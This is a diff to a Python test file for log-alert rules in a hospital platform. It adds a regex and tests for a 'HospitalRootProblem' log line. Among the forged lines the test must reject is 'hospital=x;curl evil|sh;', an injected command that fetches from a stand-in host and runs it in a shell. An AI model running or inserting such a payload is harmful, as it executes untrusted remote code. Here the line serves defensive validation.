@@ -82,13 +82,18 @@ STAFF_LINE = (r"^ihr-staff: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) "
               r"action=(?:reset_sign_in|resend_invitation|cancel_invitation) "
               r"outcome=(?:protected|not-allowed|admin-target|reset-refused)$")
 STAFF_SERVICES = "backend, provisioner, staff-worker"
+# The hospital root (deploy/logs/alerts/root.yml, P1-T25): our whole fixed line from the fleet
+# runner and the restore, a root with no admin or an invalid one, and the operator token
+ROOT_LINE = (r"^ihr-root: hospital=(?P<hospital>[a-z][a-z0-9-]{2,30}) action=(?:ensure|place) "
+             r"outcome=(?:no-admin|invalid|failed) by=[A-Za-z0-9_.-]{1,64}$")
 HOSPITAL_LINES = {"PackApplyFailed": ("ihr-packs", PACKS_LINE, "migrate, celery"),
                   "HospitalNotServed": ("ihr-fleet", FLEET_LINE, "migrate, celery, celery-worker"),
                   "ReleaseWindowOverrun": ("ihr-fleet", OVERRUN_LINE, "celery, celery-worker"),
                   "AuditHospitalCheckFailed": ("ihr-audit", AUDIT_LINE, "audit-watch"),
                   "AuditHospitalSealLate": ("ihr-audit", AUDIT_SEAL_LINE, "audit-watch"),
                   "DumpHospitalHeld": ("ihr-dump", DUMP_HELD_LINE, "dumper"),
-                  "StaffResetRefused": ("ihr-staff", STAFF_LINE, STAFF_SERVICES)}
+                  "StaffResetRefused": ("ihr-staff", STAFF_LINE, STAFF_SERVICES),
+                  "HospitalRootProblem": ("ihr-root", ROOT_LINE, "migrate, celery")}
 # A refused database role (deploy/logs/alerts/db-roles.yml, P1-T19a): our whole fixed line, a
 # role and a reason code (never a value), from the services that run as a declared role
 DB_ROLE_LINE = r"^ihr-db-role: refused role=(?P<role>app|owner|watch|none) reason=(?P<reason>[a-z_]{3,24})$"
@@ -445,6 +450,7 @@ class LogAlerts(unittest.TestCase):
                                          "DatabaseStatementTimeouts",
                                          "DumpHospitalFailed", "DumpHospitalHeld",
                                          "FailedSignInsFromAddress", "HospitalNotServed", "HospitalRestoreFailed",
+                                         "HospitalRootProblem",
                                          "MrdRecordsOffHours", "MrdRecordsRefused", "MrdRecordsVolume",
                                          "PackApplyFailed", "PackFacilityDeferred", "ParkedSchemaOverdue",
                                          "RateLimitedAddress", "ReleaseWindowOverrun", "SignInLockoutStorm",
@@ -587,6 +593,33 @@ class LogAlerts(unittest.TestCase):
         self.assertIn('f"{LOG_PREFIX} hospital={_slug()} grant={_number(grant_id)} "', code)
         self.assertIn('f"user={_number(user_id)} reason={code} outcome={outcome} hour={hour:02d}"', code)
         self.assertIn('os.write(2, f"{line}\\n".encode())', code)
+
+    def test_root_line_is_ours_alone(self):
+        """P1-T25: only the whole fixed line `ihr_identity.roots.log_line` writes, for a root with
+        no admin, an invalid one or a failed or deferred fleet step (review T3); never "done", a count line, a request path or a longer line."""
+        [expr] = [r["expr"] for _, r in self.rules() if r["alert"] == "HospitalRootProblem"]
+        self.assertIn('extract_regexp "%s"' % ROOT_LINE, expr)
+        line = re.compile(ROOT_LINE)
+        for ok in ("ihr-root: hospital=alpha action=place outcome=no-admin by=fleet-startup",
+                   "ihr-root: hospital=beta action=ensure outcome=invalid by=restore-op.x",
+                   "ihr-root: hospital=eta action=ensure outcome=failed by=fleet-startup"):
+            self.assertIsNotNone(line.match(ok), ok)
+        for forged in ('10.0.0.9 - - [x] "GET /api/ihr-root: hospital=fake action=place outcome=no-admin by=x" 404 1',
+                       "Not Found: /ihr-root: hospital=fake action=place outcome=no-admin by=x",
+                       "ihr-root: hospital=x;curl evil|sh; action=place outcome=no-admin by=x",
+                       "ihr-root: hospital=alpha action=place outcome=done by=fleet-startup",
+                       "ihr-root: hospital=alpha action=ensure outcome=state-admins n=2 by=fleet-startup",
+                       "ihr-root: hospital=alpha action=remove-state outcome=done n=1 by=op.x",
+                       "ihr-root: hospital=alpha action=place outcome=no-admin by=a@b.test",
+                       "ihr-root: hospital=Alpha action=place outcome=no-admin by=x",
+                       "ihr-root: hospital=alpha action=place outcome=no-admin by=x (and more)",
+                       "ihr-root: hospital=alpha action=place outcome=no-admin by=x\nmore"):
+            self.assertIsNone(line.search(forged), forged)
+        # The root module writes exactly this line, its operator reduced to the token's letters
+        roots = (ROOT / "plugins" / "ihr_platform" / "ihr_identity" / "roots.py").read_text()
+        self.assertIn('f"{LOG_PREFIX} hospital={slug} action={action} outcome={outcome}{count} "', roots)
+        self.assertIn('f"by={operator_token(operator)}"', roots)
+        self.assertIn('_SAFE = re.compile(r"[^A-Za-z0-9_.-]")', roots)
 
     def test_fleet_line_is_ours_alone(self):
         """As the pack line (S1), for the fleet runner's line (P1-T18a): only the three outcomes
@@ -831,7 +864,8 @@ class LogAlerts(unittest.TestCase):
                                  "DumpHospitalFailed": None, "DumpHospitalHeld": None,
                                  "HospitalRestoreFailed": None, "ParkedSchemaOverdue": None,
                                  "MrdRecordsRefused": None, "MrdRecordsVolume": None,
-                                 "MrdRecordsOffHours": None, "StaffResetRefused": None})
+                                 "MrdRecordsOffHours": None, "StaffResetRefused": None,
+                                 "HospitalRootProblem": None})
         anytime = sorted(r["alert"] for _, r in self.rules() if r["labels"].get("notify") == "anytime")
         self.assertEqual(anytime, ["FailedSignInsFromAddress", "RateLimitedAddress", "SignInLockoutsFromAddress"])
         cfg = func("monitoring_config")
